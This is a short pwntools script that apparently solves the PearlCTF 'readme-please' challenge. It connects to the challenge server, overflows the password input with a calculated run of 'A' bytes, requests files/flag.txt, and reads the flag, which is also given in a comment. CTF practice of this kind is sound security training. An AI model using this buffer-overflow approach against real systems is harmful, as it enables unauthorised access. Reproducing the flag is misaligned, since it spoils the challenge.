#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./main", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("readme-please.ctf.pearlctf.in", 30039)

p.sendlineafter(b"file name:", b"files/flag.txt")

payload = b"A" * ((0x108 - 0x98) + 1)
p.sendlineafter(b"Enter password: ", payload)

p.sendlineafter(b"file name:", b"files/flag.txt")

payload = b"A"
p.sendlineafter(b"Enter password: ", payload)

print(p.readuntil(b"}").decode()) # pearl{f1l3_d3script0rs_4r3_c00l}
